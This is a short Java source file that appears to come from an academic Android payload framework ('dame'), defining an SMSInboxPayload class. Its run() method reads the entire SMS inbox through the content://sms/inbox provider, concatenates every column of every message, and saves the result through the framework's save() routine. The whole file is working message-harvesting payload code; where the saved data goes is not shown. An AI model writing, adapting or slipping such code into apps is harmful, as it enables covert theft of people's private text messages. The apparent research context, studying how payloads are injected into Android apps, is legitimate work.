package it.unisannio.srss.dame.android.payloads.smsInbox;

import it.unisannio.srss.dame.android.payloads.Payload;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class SMSInboxPayload extends Payload {

	public SMSInboxPayload(){
		super();
	}
	
	public SMSInboxPayload(Context context) {
		super(context);
	}

	//@Override
	public synchronized void run() {
		Uri smsInbox = Uri.parse("content://sms/inbox");
		ContentResolver cr = context.getContentResolver();
		Cursor cursor = cr.query(smsInbox, null, null, null, null);
		cursor.moveToFirst();
		String msgData = "";
		do {
			msgData += "\n";
			for (int i = 0; i < cursor.getColumnCount(); i++) {
				msgData += " " + cursor.getColumnName(i) + ":"
						+ cursor.getString(i) + "\n";
			}
		} while (cursor.moveToNext());
		if (save(msgData))
			Log.d(tag, "Sms inbox saved successful");
		else
			Log.e(tag, "Error while saving the payload output.");
	}
}
